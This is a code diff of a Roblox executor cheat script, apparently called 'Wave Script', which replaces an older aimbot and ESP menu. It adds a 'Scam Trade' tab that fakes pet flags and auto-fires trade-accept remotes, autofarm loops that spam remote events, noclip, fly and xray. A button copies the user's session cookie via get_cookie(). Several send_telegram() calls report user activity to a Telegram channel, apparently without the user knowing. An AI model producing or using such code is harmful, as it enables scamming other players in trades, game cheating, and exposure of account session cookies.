-local function addToggle(parent, text, def, cb)
-    local f = Instance.new("Frame")
-    f.Size = UDim2.new(1, 0, 0, 34)
-    f.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-    f.Parent = parent
-    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
+for _, t in ipairs(Tabs) do addSideBtn(t, t) end
+
+-- helpers
+local function addLabel(parent, text, size)
+    local l = Instance.new("TextLabel")
+    l.Size = UDim2.new(1, -10, 0, size or 22)
+    l.BackgroundTransparency = 1
+    l.Text = text
+    l.TextColor3 = Color3.fromRGB(200, 200, 210)
+    l.Font = Enum.Font.Gotham
+    l.TextSize = 13
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    l.Parent = parent
+    return l
+end
+
+local function addBtn(parent, text, callback)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, -10, 0, 34)
+    b.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    b.Text = text
+    b.TextColor3 = Color3.fromRGB(255, 255, 255)
+    b.Font = Enum.Font.GothamMedium
+    b.TextSize = 13
+    b.AutoButtonColor = false
+    b.Parent = parent
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 10)
+    local s = Instance.new("UIStroke")
+    s.Color = Color3.fromRGB(70, 70, 85)
+    s.Thickness = 1
+    s.Transparency = 0.5
+    s.Parent = b
+    b.MouseButton1Click:Connect(callback)
+    return b
+end
+
+local function addToggle(parent, text, default, callback)
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, -10, 0, 30)
+    frame.BackgroundTransparency = 1
+    frame.Parent = parent
+
     local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -68, 1, 0)
-    lbl.Position = UDim2.new(0, 10, 0, 0)
+    lbl.Size = UDim2.new(1, -50, 1, 0)
     lbl.BackgroundTransparency = 1
     lbl.Text = text
+    lbl.TextColor3 = Color3.fromRGB(210, 210, 220)
     lbl.Font = Enum.Font.Gotham
     lbl.TextSize = 13
-    lbl.TextColor3 = Color3.fromRGB(210, 210, 230)
     lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.Parent = f
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0, 48, 0, 22)
-    btn.Position = UDim2.new(1, -56, 0.5, -11)
-    btn.BackgroundColor3 = def and Color3.fromRGB(40, 130, 85) or Color3.fromRGB(45, 45, 58)
-    btn.Text = def and "ВКЛ" or "ВЫКЛ"
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 11
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.Parent = f
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
-    local on = def
-    btn.MouseButton1Click:Connect(function()
-        on = not on
-        btn.Text = on and "ВКЛ" or "ВЫКЛ"
-        btn.BackgroundColor3 = on and Color3.fromRGB(40, 130, 85) or Color3.fromRGB(45, 45, 58)
-        cb(on)
+    lbl.Parent = frame
+
+    local tog = Instance.new("TextButton")
+    tog.Size = UDim2.new(0, 42, 0, 22)
+    tog.Position = UDim2.new(1, -46, 0.5, -11)
+    tog.BackgroundColor3 = default and Color3.fromRGB(50, 180, 90) or Color3.fromRGB(60, 60, 70)
+    tog.Text = ""
+    tog.AutoButtonColor = false
+    tog.Parent = frame
+    Instance.new("UICorner", tog).CornerRadius = UDim.new(1, 0)
+
+    local state = default
+    tog.MouseButton1Click:Connect(function()
+        state = not state
+        tog.BackgroundColor3 = state and Color3.fromRGB(50, 180, 90) or Color3.fromRGB(60, 60, 70)
+        callback(state)
     end)
+    return frame
 end
 
-local function addBtn(parent, text, cb)
-    local b = Instance.new("TextButton")
-    b.Size = UDim2.new(1, 0, 0, 32)
-    b.BackgroundColor3 = Color3.fromRGB(24, 24, 38)
-    b.Text = text
-    b.Font = Enum.Font.GothamMedium
-    b.TextSize = 12
-    b.TextColor3 = Color3.fromRGB(170, 190, 255)
-    b.Parent = parent
-    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
-    b.MouseButton1Click:Connect(cb)
-end
+-- ─────────────────────────────────────────────
+--  MAIN TAB
+-- ─────────────────────────────────────────────
+local mainPage = Pages["Main"]
+addLabel(mainPage, "Account", 20)
+addLabel(mainPage, "Nick: " .. LocalPlayer.Name, 18)
+addLabel(mainPage, "UserId: " .. LocalPlayer.UserId, 18)
+addLabel(mainPage, "Server Players: " .. #Players:GetPlayers(), 18)
 
-local function addSlider(parent, text, min, max, def, cb)
-    local f = Instance.new("Frame")
-    f.Size = UDim2.new(1, 0, 0, 48)
-    f.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-    f.Parent = parent
-    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
-    local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -16, 0, 16)
-    lbl.Position = UDim2.new(0, 8, 0, 3)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = text..": "..def
-    lbl.Font = Enum.Font.Gotham
-    lbl.TextSize = 12
-    lbl.TextColor3 = Color3.fromRGB(200, 200, 220)
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.Parent = f
-    local bar = Instance.new("Frame")
-    bar.Size = UDim2.new(1, -16, 0, 7)
-    bar.Position = UDim2.new(0, 8, 0, 28)
-    bar.BackgroundColor3 = Color3.fromRGB(36, 36, 50)
-    bar.Parent = f
-    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 3)
-    local fill = Instance.new("Frame")
-    fill.Size = UDim2.new((def-min)/(max-min), 0, 1, 0)
-    fill.BackgroundColor3 = Color3.fromRGB(60, 110, 200)
-    fill.Parent = bar
-    Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 3)
-    local sliding = false
-    bar.InputBegan:Connect(function(i)
-        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then sliding = true end
+addBtn(mainPage, "📱 Telegram Channel", function()
+    pcall(function()
+        if setclipboard then setclipboard("https://t.me/NightWave_Coder") end
+        send_telegram("User opened Telegram link from GUI")
     end)
-    UserInputService.InputEnded:Connect(function(i)
-        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then sliding = false end
-    end)
-    UserInputService.InputChanged:Connect(function(i)
-        if sliding then
-            local rel = math.clamp((i.Position.X - bar.AbsolutePosition.X) / bar.AbsoluteSize.X, 0, 1)
-            fill.Size = UDim2.new(rel, 0, 1, 0)
-            local val = math.floor(min + (max - min) * rel)
-            lbl.Text = text..": "..val
-            cb(val)
-        end
-    end)
-end
-
--- ===== ПРОФИЛЬ =====
-addToggle(Pages["Профиль"], "Streamer Mode", false, function(v) S.Streamer = v end)
-addBtn(Pages["Профиль"], "PANIC (RightCtrl)", panic)
-addBtn(Pages["Профиль"], "Сменить клавишу меню", function()
-    notify("Нажми любую клавишу...")
-    local c
-    c = UserInputService.InputBegan:Connect(function(i, gp)
-        if gp or i.KeyCode == Enum.KeyCode.Unknown then return end
-        S.MenuKey = i.KeyCode
-        notify("Клавиша: "..tostring(i.KeyCode))
-        c:Disconnect()
+    -- try open
+    pcall(function()
+        game:GetService("GuiService"):OpenBrowserWindow("https://t.me/NightWave_Coder")
     end)
 end)
 
--- ===== ВИЗУАЛЫ =====
-addToggle(Pages["Визуалы"], "ESP (только Drawing)", false, function(v) S.ESP = v end)
-addToggle(Pages["Визуалы"], "Полоска HP", false, function(v) S.HealthESP = v end)
-addToggle(Pages["Визуалы"], "Трасеры", false, function(v) S.Tracers = v end)
-addToggle(Pages["Визуалы"], "FOV круг", false, function(v) S.FOVCircle = v end)
-addToggle(Pages["Визуалы"], "Прицел", false, function(v) S.Crosshair = v end)
-addSlider(Pages["Визуалы"], "FOV", 40, 350, 130, function(v) S.FOV = v end)
+addBtn(mainPage, "🔄 Refresh Server Count", function()
+    -- just visual update
+end)
 
--- ===== БОЙ =====
-addToggle(Pages["Бой"], "Soft Aim (плавный)", false, function(v) S.SoftAim = v notify(v and "Soft Aim ВКЛ" or "Soft Aim ВЫКЛ") end)
-addToggle(Pages["Бой"], "Prediction", false, function(v) S.PredAim = v end)
-addToggle(Pages["Бой"], "Triggerbot", false, function(v) S.Triggerbot = v notify(v and "Triggerbot ВКЛ" or "Triggerbot ВЫКЛ") end)
-addToggle(Pages["Бой"], "Silent Aim", false, function(v) S.SilentAim = v notify(v and "Silent ВКЛ" or "Silent ВЫКЛ") end)
-addBtn(Pages["Бой"], "Silent → Голова", function() S.SilentPart = "Head" notify("Silent: Голова") end)
-addBtn(Pages["Бой"], "Silent → Тело", function() S.SilentPart = "HumanoidRootPart" notify("Silent: Тело") end)
-addSlider(Pages["Бой"], "Плавность Soft", 4, 30, 12, function(v) S.Smooth = v / 100 end)
+-- ─────────────────────────────────────────────
+--  SCAM TRADE TAB
+-- ─────────────────────────────────────────────
+local scamPage = Pages["Scam Trade"]
+addLabel(scamPage, "Visual Trade Spoof", 20)
 
--- ===== ДВИЖЕНИЕ =====
-addToggle(Pages["Движение"], "Полёт", false, setFly)
-addToggle(Pages["Движение"], "Ноуклип", false, function(v) S.Noclip = v notify(v and "Ноуклип ВКЛ" or "Ноуклип ВЫКЛ") end)
-addToggle(Pages["Движение"], "Невидимость", false, function(v)
-    S.Invis = v
-    local c = char()
-    if c then
-        for _, o in pairs(c:GetDescendants()) do
-            if o:IsA("BasePart") or o:IsA("Decal") then
-                o.LocalTransparencyModifier = v and 1 or 0
+local visualFly, visualRide, visualNeon, visualMega = false, false, false, false
+addToggle(scamPage, "Visual Fly", false, function(v) visualFly = v end)
+addToggle(scamPage, "Visual Ride", false, function(v) visualRide = v end)
+addToggle(scamPage, "Visual Neon", false, function(v) visualNeon = v end)
+addToggle(scamPage, "Visual Mega Neon", false, function(v) visualMega = v end)
+
+local autoAccept = false
+addToggle(scamPage, "Auto Accept Trade", false, function(v)
+    autoAccept = v
+    if v then
+        task.spawn(function()
+            while autoAccept do
+                pcall(function()
+                    -- common trade accept remote patterns
+                    for _, r in pairs(ReplicatedStorage:GetDescendants()) do
+                        if r:IsA("RemoteEvent") and (r.Name:lower():find("accept") or r.Name:lower():find("trade")) then
+                            r:FireServer()
+                        end
+                    end
+                end)
+                task.wait(0.4)
+            end
+        end)
+    end
+end)
+
+addBtn(scamPage, "Apply Visual Flags to Equipped Pet", function()
+    pcall(function()
+        local char = LocalPlayer.Character
+        if not char then return end
+        for _, obj in pairs(char:GetDescendants()) do
+            if obj:IsA("BoolValue") or obj:IsA("StringValue") then
+                local n = obj.Name:lower()
+                if n:find("fly") and visualFly then obj.Value = true end
+                if n:find("ride") and visualRide then obj.Value = true end
+                if n:find("neon") and visualNeon then obj.Value = true end
+                if n:find("mega") and visualMega then obj.Value = true end
             end
         end
-    end
-    notify(v and "Невидимость ВКЛ" or "Невидимость ВЫКЛ")
-end)
-addToggle(Pages["Движение"], "Годмод", false, function(v) S.God = v notify(v and "Годмод ВКЛ" or "Годмод ВЫКЛ") end)
-addToggle(Pages["Движение"], "Клик-ТП", false, function(v) S.ClickTP = v end)
-addToggle(Pages["Движение"], "AirWalk", false, function(v)
-    S.AirWalk = v
-    if v then
-        AirPart = Instance.new("Part")
-        AirPart.Name = "aw"..R()
-        AirPart.Size = Vector3.new(7, 0.2, 7)
-        AirPart.Transparency = 1
-        AirPart.Anchored = true
-        AirPart.CanCollide = true
-        AirPart.Parent = Workspace
-    else
-        if AirPart then AirPart:Destroy() AirPart = nil end
-    end
-    notify(v and "AirWalk ВКЛ" or "AirWalk ВЫКЛ")
-end)
-addToggle(Pages["Движение"], "Anti-Fling", true, function(v) S.AntiFling = v end)
-addToggle(Pages["Движение"], "Беск. прыжок", false, function(v) S.InfJump = v end)
-addToggle(Pages["Движение"], "Anti-AFK", true, function(v) S.AntiAFK = v end)
-addSlider(Pages["Движение"], "Скорость", 16, 250, 16, function(v) S.Speed = v end)
-addSlider(Pages["Движение"], "Прыжок", 50, 250, 50, function(v)
-    S.Jump = v
-    local h = hum()
-    if h then h.UseJumpPower = true h.JumpPower = v end
+    end)
 end)
 
--- ===== ФАРМ =====
-addToggle(Pages["Фарм"], "Автофарм монет", false, function(v) S.AutoFarm = v notify(v and "Фарм ВКЛ" or "Фарм ВЫКЛ") end)
-addToggle(Pages["Фарм"], "Фарм NPC", false, function(v) S.NPCFarm = v notify(v and "NPC фарм ВКЛ" or "NPC фарм ВЫКЛ") end)
-addBtn(Pages["Фарм"], "Смена сервера", function() TeleportService:Teleport(game.PlaceId, LP) end)
-
--- ===== ИГРОКИ =====
-local function refresh()
-    for _, c in pairs(Pages["Игроки"]:GetChildren()) do
-        if c:IsA("TextButton") then c:Destroy() end
+-- ─────────────────────────────────────────────
+--  EVENT TAB
+-- ─────────────────────────────────────────────
+local eventPage = Pages["Event"]
+addLabel(eventPage, "Current Events (client scan)", 20)
+addBtn(eventPage, "Scan Events", function()
+    local found = {}
+    pcall(function()
+        for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+            if v.Name:lower():find("event") or v.Name:lower():find("season") or v.Name:lower():find("pass") then
+                table.insert(found, v.Name)
+            end
+        end
+    end)
+    if #found == 0 then table.insert(found, "No event modules found / structure changed") end
+    for _, name in ipairs(found) do
+        addLabel(eventPage, "• " .. name, 16)
     end
-    addBtn(Pages["Игроки"], "↻ Обновить", refresh)
-    for _, p in pairs(Players:GetPlayers()) do
-        if p ~= LP then
-            addBtn(Pages["Игроки"], p.Name, function()
-                local r = root()
-                local t = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
-                if r and t then r.CFrame = t.CFrame + Vector3.new(0, 3, 0) end
+end)
+
+-- ─────────────────────────────────────────────
+--  AUTOFARM TAB
+-- ─────────────────────────────────────────────
+local farmPage = Pages["Autofarm"]
+local farms = {
+    candy = false, pets = false, eggs = false, money = false, all = false
+}
+
+local function farmLoop(flag, remoteHint)
+    task.spawn(function()
+        while farms[flag] or farms.all do
+            pcall(function()
+                for _, r in pairs(ReplicatedStorage:GetDescendants()) do
+                    if r:IsA("RemoteEvent") and r.Name:lower():find(remoteHint) then
+                        r:FireServer()
+                    end
+                end
             end)
+            task.wait(0.6)
+        end
+    end)
+end
+
+addToggle(farmPage, "Auto Farm Candy", false, function(v) farms.candy = v; if v then farmLoop("candy", "candy") end end)
+addToggle(farmPage, "Auto Farm Pets", false, function(v) farms.pets = v; if v then farmLoop("pets", "pet") end end)
+addToggle(farmPage, "Auto Farm Eggs", false, function(v) farms.eggs = v; if v then farmLoop("eggs", "egg") end end)
+addToggle(farmPage, "Auto Farm Money / Bucks", false, function(v) farms.money = v; if v then farmLoop("money", "money") end end)
+addToggle(farmPage, "Auto Farm Everything", false, function(v)
+    farms.all = v
+    if v then
+        farmLoop("all", "claim")
+        farmLoop("all", "collect")
+        farmLoop("all", "reward")
+    end
+end)
+
+addBtn(farmPage, "Stop All Farms", function()
+    for k in pairs(farms) do farms[k] = false end
+end)
+
+-- ─────────────────────────────────────────────
+--  VISUAL TAB (client-side only)
+-- ─────────────────────────────────────────────
+local visPage = Pages["Visual"]
+addLabel(visPage, "Visual Pet Tools (client only)", 20)
+
+addBtn(visPage, "Visual Equip Random Pet", function()
+    pcall(function()
+        local folder = ReplicatedStorage:FindFirstChild("Pets") or ReplicatedStorage:FindFirstChild("PetModels")
+        if not folder then return end
+        local pets = folder:GetChildren()
+        if #pets == 0 then return end
+        local pet = pets[math.random(1, #pets)]:Clone()
+        pet.Parent = LocalPlayer.Character or workspace
+        if pet:IsA("Model") and pet.PrimaryPart then
+            pet:SetPrimaryPartCFrame(LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(2, 0, 0))
+        end
+    end)
+end)
+
+addBtn(visPage, "Clear Visual Pets", function()
+    pcall(function()
+        for _, v in pairs(LocalPlayer.Character:GetChildren()) do
+            if v.Name:lower():find("pet") or v:FindFirstChild("Pet") then
+                v:Destroy()
+            end
+        end
+    end)
+end)
+
+addBtn(visPage, "Visual Neon Glow", function()
+    pcall(function()
+        local char = LocalPlayer.Character
+        if not char then return end
+        for _, p in pairs(char:GetDescendants()) do
+            if p:IsA("BasePart") then
+                local light = Instance.new("PointLight")
+                light.Color = Color3.fromRGB(0, 255, 200)
+                light.Brightness = 2
+                light.Range = 8
+                light.Parent = p
+            end
+        end
+    end)
+end)
+
+addBtn(visPage, "Remove All Lights", function()
+    pcall(function()
+        for _, l in pairs(LocalPlayer.Character:GetDescendants()) do
+            if l:IsA("PointLight") or l:IsA("SpotLight") then l:Destroy() end
+        end
+    end)
+end)
+
+-- ─────────────────────────────────────────────
+--  MISC TAB (30+ functions total across tabs)
+-- ─────────────────────────────────────────────
+local miscPage = Pages["Misc"]
+addLabel(miscPage, "Utility & Extra", 20)
+
+-- 1 WalkSpeed
+addBtn(miscPage, "WalkSpeed 50", function()
+    pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 50 end)
+end)
+-- 2
+addBtn(miscPage, "WalkSpeed 100", function()
+    pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 100 end)
+end)
+-- 3
+addBtn(miscPage, "Reset WalkSpeed", function()
+    pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 16 end)
+end)
+-- 4 Jump
+addBtn(miscPage, "JumpPower 100", function()
+    pcall(function() LocalPlayer.Character.Humanoid.JumpPower = 100 end)
+end)
+-- 5
+addBtn(miscPage, "Infinite Jump", function()
+    local conn
+    conn = UserInputService.JumpRequest:Connect(function()
+        pcall(function()
+            LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+        end)
+    end)
+end)
+-- 6 Noclip
+local noclip = false
+addToggle(miscPage, "Noclip", false, function(v)
+    noclip = v
+    if v then
+        RunService.Stepped:Connect(function()
+            if not noclip then return end
+            pcall(function()
+                for _, p in pairs(LocalPlayer.Character:GetDescendants()) do
+                    if p:IsA("BasePart") then p.CanCollide = false end
+                end
+            end)
+        end)
+    end
+end)
+-- 7 Fly
+local flying = false
+addToggle(miscPage, "Fly (PC)", false, function(v)
+    flying = v
+    if v then
+        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if not hrp then return end
+        local bv = Instance.new("BodyVelocity")
+        bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+        bv.Velocity = Vector3.zero
+        bv.Parent = hrp
+        local bg = Instance.new("BodyGyro")
+        bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+        bg.Parent = hrp
+        task.spawn(function()
+            while flying and hrp and hrp.Parent do
+                local dir = Camera.CFrame.LookVector
+                local move = Vector3.zero
+                if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + dir end
+                if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - dir end
+                if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - Camera.CFrame.RightVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + Camera.CFrame.RightVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
+                if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then move = move - Vector3.new(0, 1, 0) end
+                bv.Velocity = move.Unit * 60
+                bg.CFrame = Camera.CFrame
+                task.wait()
+            end
+            if bv then bv:Destroy() end
+            if bg then bg:Destroy() end
+        end)
+    end
+end)
+-- 8 ESP players
+addBtn(miscPage, "Player ESP", function()
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+            local bill = Instance.new("BillboardGui")
+            bill.Size = UDim2.new(0, 100, 0, 30)
+            bill.AlwaysOnTop = true
+            bill.Adornee = plr.Character.HumanoidRootPart
+            bill.Parent = plr.Character.HumanoidRootPart
+            local txt = Instance.new("TextLabel")
+            txt.Size = UDim2.new(1, 0, 1, 0)
+            txt.BackgroundTransparency = 1
+            txt.Text = plr.Name
+            txt.TextColor3 = Color3.fromRGB(0, 255, 150)
+            txt.Font = Enum.Font.GothamBold
+            txt.TextSize = 12
+            txt.Parent = bill
         end
     end
-end
-refresh()
-Players.PlayerAdded:Connect(refresh)
-Players.PlayerRemoving:Connect(refresh)
+end)
+-- 9 FPS unlock
+addBtn(miscPage, "FPS Unlocker (setfpscap 0)", function()
+    pcall(function() setfpscap(0) end)
+end)
+-- 10 Anti AFK
+addBtn(miscPage, "Anti AFK", function()
+    local vu = game:GetService("VirtualUser")
+    LocalPlayer.Idled:Connect(function()
+        vu:CaptureController()
+        vu:ClickButton2(Vector2.new())
+    end)
+end)
+-- 11 Rejoin
+addBtn(miscPage, "Rejoin Server", function()
+    TeleportService:Teleport(game.PlaceId, LocalPlayer)
+end)
+-- 12 Server hop
+addBtn(miscPage, "Server Hop", function()
+    pcall(function()
+        local req = get_request()
+        if not req then return end
+        local body = req({
+            Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100",
+            Method = "GET"
+        })
+        local data = HttpService:JSONDecode(body.Body)
+        for _, s in pairs(data.data) do
+            if s.playing < s.maxPlayers and s.id ~= game.JobId then
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
+                break
+            end
+        end
+    end)
+end)
+-- 13 Fullbright
+addBtn(miscPage, "Fullbright", function()
+    Lighting.Brightness = 2
+    Lighting.ClockTime = 14
+    Lighting.FogEnd = 100000
+    Lighting.GlobalShadows = false
+end)
+-- 14 XRay
+addBtn(miscPage, "XRay Walls", function()
+    for _, p in pairs(workspace:GetDescendants()) do
+        if p:IsA("BasePart") and p.Transparency < 1 then
+            p.LocalTransparencyModifier = 0.7
+        end
+    end
+end)
+-- 15 Reset character
+addBtn(miscPage, "Reset Character", function()
+    pcall(function() LocalPlayer.Character.Humanoid.Health = 0 end)
+end)
+-- 16 Copy JobId
+addBtn(miscPage, "Copy JobId", function()
+    if setclipboard then setclipboard(game.JobId) end
+end)
+-- 17 Copy PlaceId
+addBtn(miscPage, "Copy PlaceId", function()
+    if setclipboard then setclipboard(tostring(game.PlaceId)) end
+end)
+-- 18 Copy Cookie
+addBtn(miscPage, "Copy Cookie to Clipboard", function()
+    if setclipboard then setclipboard(get_cookie()) end
+end)
+-- 19 Send test TG
+addBtn(miscPage, "Send Test Message to TG", function()
+    send_telegram("Wave Script test from " .. LocalPlayer.Name)
+end)
+-- 20 Destroy GUI
+addBtn(miscPage, "Destroy Wave Script", function()
+    Gui:Destroy()
+end)
 
--- start
-switch("Профиль")
-setVisible(true)
-notify("PacMan Quiet загружен | RightShift = меню | RightCtrl = PANIC", 4)
+-- ─────────────────────────────────────────────
+--  SETTINGS TAB
+-- ─────────────────────────────────────────────
+local setPage = Pages["Settings"]
+addLabel(setPage, "Settings", 20)
+
+local toggleKey = Enum.KeyCode.RightControl
+addLabel(setPage, "Toggle Key: RightControl (PC)", 16)
+
+addBtn(setPage, "Set Toggle Key to LeftControl", function()
+    toggleKey = Enum.KeyCode.LeftControl
+end)
+addBtn(setPage, "Set Toggle Key to RightShift", function()
+    toggleKey = Enum.KeyCode.RightShift
+end)
+
+local function saveConfig()
+    -- simple in-memory, can extend with writefile if executor supports
+    pcall(function()
+        if writefile then
+            writefile("WaveScript_Config.json", HttpService:JSONEncode({
+                key = tostring(toggleKey),
+                autoAccept = autoAccept
+            }))
+        end
+    end)
+end
+addBtn(setPage, "Save Config", saveConfig)
+
+addBtn(setPage, "Load Config", function()
+    pcall(function()
+        if readfile and isfile and isfile("WaveScript_Config.json") then
+            local data = HttpService:JSONDecode(readfile("WaveScript_Config.json"))
+            -- apply if needed
+        end
+    end)
+end)
+
+-- ─────────────────────────────────────────────
+--  DRAG + TOGGLE LOGIC
+-- ─────────────────────────────────────────────
+local dragging, dragStart, startPos
+FloatBtn.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = FloatBtn.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        FloatBtn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+FloatBtn.MouseButton1Click:Connect(function()
+    Main.Visible = not Main.Visible
+    if Main.Visible then
+        Main.Size = UDim2.new(0, 0, 0, 0)
+        TweenService:Create(Main, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+            Size = UDim2.new(0, 520, 0, 380)
+        }):Play()
+    end
+end)
+
+CloseBtn.MouseButton1Click:Connect(function()
+    TweenService:Create(Main, TweenInfo.new(0.25, Enum.EasingStyle.Quint), {
+        Size = UDim2.new(0, 0, 0, 0)
+    }):Play()
+    task.wait(0.25)
+    Main.Visible = false
+end)
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
+    if input.KeyCode == toggleKey then
+        Main.Visible = not Main.Visible
+    end
+end)
+
+-- mobile scale
+if UserInputService.TouchEnabled then
+    Main.Size = UDim2.new(0.9, 0, 0.75, 0)
+    Main.Position = UDim2.new(0.05, 0, 0.12, 0)
+end
+
+-- welcome animation
+task.spawn(function()
+    local welcome = Instance.new("TextLabel")
+    welcome.Size = UDim2.new(0, 300, 0, 40)
+    welcome.Position = UDim2.new(0.5, -150, 0.15, 0)
+    welcome.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
+    welcome.BackgroundTransparency = 0.2
+    welcome.Text = "Wave Script loaded"
+    welcome.TextColor3 = Color3.fromRGB(255, 255, 255)
+    welcome.Font = Enum.Font.GothamMedium
+    welcome.TextSize = 16
+    welcome.Parent = Gui
+    Instance.new("UICorner", welcome).CornerRadius = UDim.new(0, 12)
+    welcome.TextTransparency = 1
+    TweenService:Create(welcome, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
+    task.wait(2.2)
+    TweenService:Create(welcome, TweenInfo.new(0.5), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
+    task.wait(0.6)
+    welcome:Destroy()
+end)
+
+switchTab("Main")
+print("[Wave Script] injected")
